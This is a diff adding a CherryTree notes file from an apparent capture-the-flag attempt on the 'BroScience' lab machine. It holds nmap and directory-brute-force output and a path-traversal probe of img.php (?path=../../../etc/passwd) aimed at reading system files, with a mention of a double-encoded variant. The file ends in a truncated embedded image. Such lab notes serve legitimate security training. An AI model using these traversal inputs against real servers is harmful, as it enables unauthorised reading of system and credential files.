@@ -1,0 +1,504 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <bookmarks list=""/>
+  <node name="BroScience" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1675102644" ts_lastsave="1675266711">
+    <rich_text>IP: 10.10.11.195
+OS: Debian
+tech: php
+hostname:
+
+
+Linux Proof: </rich_text>
+    <rich_text family="monospace">cat proof.txt &amp;&amp; hostname &amp;&amp; id &amp;&amp; whoami &amp;&amp; /sbin/ifconfig</rich_text>
+    <rich_text>
+Windows Proof: </rich_text>
+    <rich_text family="monospace">hostname &amp;&amp; whoami.exe &amp;&amp; whoami.exe /groups &amp;&amp; type proof.txt &amp;&amp; ipconfig /all</rich_text>
+    <rich_text>
+</rich_text>
+    <node name="Nmap" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1675102828" ts_lastsave="1675102879">
+      <rich_text justification="left"></rich_text>
+      <rich_text>
+
+asdasd: </rich_text>
+      <codebox char_offset="0" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">USAGE: ./nmapScanTCP.sh &lt;inputip&gt; &lt;outputfile&gt;
+
+the ports found are: 22,80,443,2889,13262,48905,61295
+HTB/BroScience/nmap/nmapAllTCP
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-30 13:17 EST
+NSE: Loaded 155 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 13:17
+Completed NSE at 13:17, 0.00s elapsed
+Initiating NSE at 13:17
+Completed NSE at 13:17, 0.00s elapsed
+Initiating NSE at 13:17
+Completed NSE at 13:17, 0.00s elapsed
+Initiating Ping Scan at 13:17
+Scanning 10.10.11.195 [4 ports]
+Completed Ping Scan at 13:17, 0.42s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 13:17
+Scanning broscience.htb (10.10.11.195) [7 ports]
+Discovered open port 443/tcp on 10.10.11.195
+Discovered open port 22/tcp on 10.10.11.195
+Discovered open port 80/tcp on 10.10.11.195
+Completed SYN Stealth Scan at 13:17, 0.59s elapsed (7 total ports)
+Initiating Service scan at 13:17
+Scanning 3 services on broscience.htb (10.10.11.195)
+Completed Service scan at 13:17, 14.95s elapsed (3 services on 1 host)
+Initiating OS detection (try #1) against broscience.htb (10.10.11.195)
+Retrying OS detection (try #2) against broscience.htb (10.10.11.195)
+Retrying OS detection (try #3) against broscience.htb (10.10.11.195)
+Retrying OS detection (try #4) against broscience.htb (10.10.11.195)
+Retrying OS detection (try #5) against broscience.htb (10.10.11.195)
+Initiating Traceroute at 13:18
+Completed Traceroute at 13:18, 0.65s elapsed
+Initiating Parallel DNS resolution of 1 host. at 13:18
+Completed Parallel DNS resolution of 1 host. at 13:18, 0.00s elapsed
+NSE: Script scanning 10.10.11.195.
+Initiating NSE at 13:18
+Completed NSE at 13:18, 28.59s elapsed
+Initiating NSE at 13:18
+Completed NSE at 13:18, 4.33s elapsed
+Initiating NSE at 13:18
+Completed NSE at 13:18, 0.00s elapsed
+Nmap scan report for broscience.htb (10.10.11.195)
+Host is up (0.44s latency).
+
+PORT      STATE  SERVICE  VERSION
+22/tcp    open   ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 df17c6bab18222d91db5ebff5d3d2cb7 (RSA)
+|   256 3f8a56f8958faeafe3ae7eb880f679d2 (ECDSA)
+|_  256 3c6575274ae2ef9391374cfdd9d46341 (ED25519)
+80/tcp    open   http     Apache httpd 2.4.54
+|_http-title: Did not follow redirect to https://broscience.htb/
+|_http-server-header: Apache/2.4.54 (Debian)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+443/tcp   open   ssl/http Apache httpd 2.4.54 ((Debian))
+| tls-alpn: 
+|_  http/1.1
+| ssl-cert: Subject: commonName=broscience.htb/organizationName=BroScience/countryName=AT
+| Issuer: commonName=broscience.htb/organizationName=BroScience/countryName=AT
+| Public Key type: rsa
+| Public Key bits: 4096
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2022-07-14T19:48:36
+| Not valid after:  2023-07-14T19:48:36
+| MD5:   5328ddd62f3429d11d26ae8a68d86e0c
+|_SHA-1: 20568d0d9e4109cde5a22021fe3f349c40d8d75b
+|_ssl-date: TLS randomness does not represent time
+|_http-server-header: Apache/2.4.54 (Debian)
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-title: BroScience : Home
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+2889/tcp  closed rsom
+13262/tcp closed unknown
+48905/tcp closed unknown
+61295/tcp closed unknown
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.93%E=4%D=1/30%OT=22%CT=2889%CU=44123%PV=Y%DS=2%DC=T%G=Y%TM=63D8
+OS:09FF%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10A%TI=Z%CI=Z%TS=A)SEQ(S
+OS:P=105%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M54BST11NW7%O2=M54BST11NW
+OS:7%O3=M54BNNT11NW7%O4=M54BST11NW7%O5=M54BST11NW7%O6=M54BST11)WIN(W1=FE88%
+OS:W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54BN
+OS:NSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=
+OS:Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=A
+OS:R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=4
+OS:0%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=
+OS:G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Uptime guess: 7.607 days (since Sun Jan 22 22:44:11 2023)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=261 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 13262/tcp)
+HOP RTT       ADDRESS
+1   647.49 ms 10.10.16.1 (10.10.16.1)
+2   304.02 ms broscience.htb (10.10.11.195)
+
+NSE: Script Post-scanning.
+Initiating NSE at 13:18
+Completed NSE at 13:18, 0.00s elapsed
+Initiating NSE at 13:18
+Completed NSE at 13:18, 0.00s elapsed
+Initiating NSE at 13:18
+Completed NSE at 13:18, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 77.62 seconds
+           Raw packets sent: 131 (9.790KB) | Rcvd: 111 (33.683KB)
+</codebox>
+    </node>
+    <node name="HTTP/HTTPS" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1675103136" ts_lastsave="1675202299">
+      <rich_text> nmap says </rich_text>
+      <rich_text link="webs https://broscience.htb/">https://broscience.htb/</rich_text>
+      <rich_text>
+ 
+ so i added it to /etc/hosts files
+ 
+ 
+ Dirbf gobuster
+ 
+</rich_text>
+      <rich_text justification="left"></rich_text>
+      <rich_text>
+
+
+FFUF
+
+</rich_text>
+      <rich_text justification="left"></rich_text>
+      <rich_text>
+
+
+On visiting  </rich_text>
+      <rich_text link="webs https://broscience.htb/includes/">https://broscience.htb/includes/</rich_text>
+      <rich_text> we see the following
+
+
+</rich_text>
+      <rich_text scale="h1">Index of /includes</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text justification="left"></rich_text>
+      <rich_text>
+Apache/2.4.54 (Debian) Server at broscience.htb Port 443
+
+
+On visiting the </rich_text>
+      <rich_text link="webs https://broscience.htb/includes/img.php">https://broscience.htb/includes/img.php</rich_text>
+      <rich_text> we see the following message:
+</rich_text>
+      <rich_text justification="left"></rich_text>
+      <rich_text>
+so lets add path parameter
+</rich_text>
+      <rich_text link="webs https://broscience.htb/includes/img.php?path=null">https://broscience.htb/includes/img.php?path=null</rich_text>
+      <rich_text>
+
+on visiting this page we dont see any errors
+</rich_text>
+      <rich_text justification="left"></rich_text>
+      <rich_text>
+
+on visiting the following  </rich_text>
+      <rich_text link="webs https://broscience.htb/includes/img.php?path=/etc/passwd">https://broscience.htb/includes/img.php?path=../../../etc/passwd</rich_text>
+      <rich_text> we get
+</rich_text>
+      <rich_text justification="left"></rich_text>
+      <rich_text>
+
+on using the double encoded payload we dont get the error message
+
+</rich_text>
+      <rich_text justification="left"></rich_text>
+      <rich_text>&#13;
+
+</rich_text>
+      <codebox char_offset="94" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> /index.php            (Status: 200) [Size: 163423]
+/user.php             (Status: 200) [Size: 1309]
+/login.php            (Status: 200) [Size: 1936]
+/comment.php          (Status: 302) [Size: 13] [--&gt; /login.php]
+/register.php         (Status: 200) [Size: 2161]
+/logout.php           (Status: 302) [Size: 0] [--&gt; /index.php]
+/exercise.php         (Status: 200) [Size: 1322]
+/activate.php         (Status: 200) [Size: 1256]
+</codebox>
+      <table char_offset="104" justification="left" col_min="60" col_max="60" col_widths="0,0,0,0,0,0,0,0,0,0,0">
+        <row>
+          <cell>301</cell>
+          <cell>includes</cell>
+          <cell>https://broscience.htb/includes</cell>
+          <cell>https://broscience.htb/includes/</cell>
+          <cell>637</cell>
+          <cell>321</cell>
+          <cell>20</cell>
+          <cell>10</cell>
+          <cell>text/html; charset=iso-8859-1</cell>
+          <cell>318.700829ms</cell>
+          <cell></cell>
+        </row>
+        <row>
+          <cell>301</cell>
+          <cell>manual</cell>
+          <cell>https://broscience.htb/manual</cell>
+          <cell>https://broscience.htb/manual/</cell>
+          <cell>734</cell>
+          <cell>319</cell>
+          <cell>20</cell>
+          <cell>10</cell>
+          <cell>text/html; charset=iso-8859-1</cell>
+          <cell>305.124888ms</cell>
+          <cell></cell>
+        </row>
+        <row>
+          <cell>301</cell>
+          <cell>javascript</cell>
+          <cell>https://broscience.htb/javascript</cell>
+          <cell>https://broscience.htb/javascript/</cell>
+          <cell>1060</cell>
+          <cell>323</cell>
+          <cell>20</cell>
+          <cell>10</cell>
+          <cell>text/html; charset=iso-8859-1</cell>
+          <cell>315.921754ms</cell>
+          <cell></cell>
+        </row>
+        <row>
+          <cell>301</cell>
+          <cell>styles</cell>
+          <cell>https://broscience.htb/styles</cell>
+          <cell>https://broscience.htb/styles/</cell>
+          <cell>1733</cell>
+          <cell>319</cell>
+          <cell>20</cell>
+          <cell>10</cell>
+          <cell>text/html; charset=iso-8859-1</cell>
+          <cell></cell>
+          <cell></cell>
+        </row>
+        <row>
+          <cell>301</cell>
+          <cell>images</cell>
+          <cell>https://broscience.htb/images</cell>
+          <cell>https://broscience.htb/images/</cell>
+          <cell>16</cell>
+          <cell>319</cell>
+          <cell>20</cell>
+          <cell>10</cell>
+          <cell>text/html; charset=iso-8859-1</cell>
+          <cell>316.532536ms</cell>
+          <cell></cell>
+        </row>
+      </table>
+      <table char_offset="196" justification="left" col_min="60" col_max="60" col_widths="0,0,0,0,0">
+        <row>
+          <cell></cell>
+          <cell></cell>
+          <cell></cell>
+          <cell></cell>
+          <cell></cell>
+        </row>
+        <row>
+          <cell></cell>
+          <cell>Parent Directory</cell>
+          <cell></cell>
+          <cell>-</cell>
+          <cell></cell>
+        </row>
+        <row>
+          <cell></cell>
+          <cell>db_connect.php</cell>
+          <cell>2023-01-31 16:30</cell>
+          <cell>337</cell>
+          <cell></cell>
+        </row>
+        <row>
+          <cell></cell>
+          <cell>header.php</cell>
+          <cell>2023-01-31 16:30</cell>
+          <cell>369</cell>
+          <cell></cell>
+        </row>
+        <row>
+          <cell></cell>
+          <cell>img.php</cell>
+          <cell>2023-01-31 16:30</cell>
+          <cell>483</cell>
+          <cell></cell>
+        </row>
+        <row>
+          <cell></cell>
+          <cell>navbar.php</cell>
+          <cell>2023-01-31 16:30</cell>
+          <cell>1.2K</cell>
+          <cell></cell>
+        </row>
+        <row>
+          <cell></cell>
+          <cell>utils.php</cell>
+          <cell>2023-01-31 16:30</cell>
+          <cell>3.0K</cell>
+          <cell></cell>
+        </row>
+        <row>
+          <cell></cell>
+          <cell></cell>
+          <cell></cell>
+          <cell></cell>
+          <cell></cell>
+        </row>
+        <row>
+          <cell></cell>
+          <cell>Name</cell>
+          <cell>Last modified</cell>
+          <cell>Size</cell>
+          <cell>Description</cell>
+        </row>
+      </table>
+      <codebox char_offset="343" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="html" highlight_brackets="1" show_line_numbers="0">Error: Missing 'path' parameter.</codebox>
+      <encoded_png char_offset="468" justification="left" link="">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